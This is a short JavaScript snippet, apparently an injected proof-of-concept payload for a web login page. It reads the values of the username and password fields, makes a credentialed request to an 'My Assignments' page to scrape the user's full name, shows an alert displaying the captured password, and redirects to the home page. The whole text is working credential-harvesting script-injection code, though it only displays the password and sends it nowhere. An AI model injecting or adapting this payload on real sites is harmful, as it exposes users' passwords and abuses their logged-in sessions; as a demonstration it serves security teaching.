var u = document.getElementsByName('UsernameOrEmailAddress')[0].value;
var p = document.getElementsByName('Password')[0].value;

function sayhello() {
  // Fetch the user's name by requesting the "My Assignments" page and parsing it:
  var xhr = new XMLHttpRequest();
  xhr.onload = function() {
    fullname=this.responseXML.querySelector('.card').querySelector('.pull-left').innerText;;
    // Post a creepy message:
    alert(`Hello ${fullname},\nYour password is:\n${p}`);

    // Redirect on to the main page
    document.location.href = "/";
  }
  xhr.open('GET', '/Assignments/MyAssignments');
  xhr.responseType = "document";
  xhr.withCredentials = true;
  xhr.send();
}

sayhello();
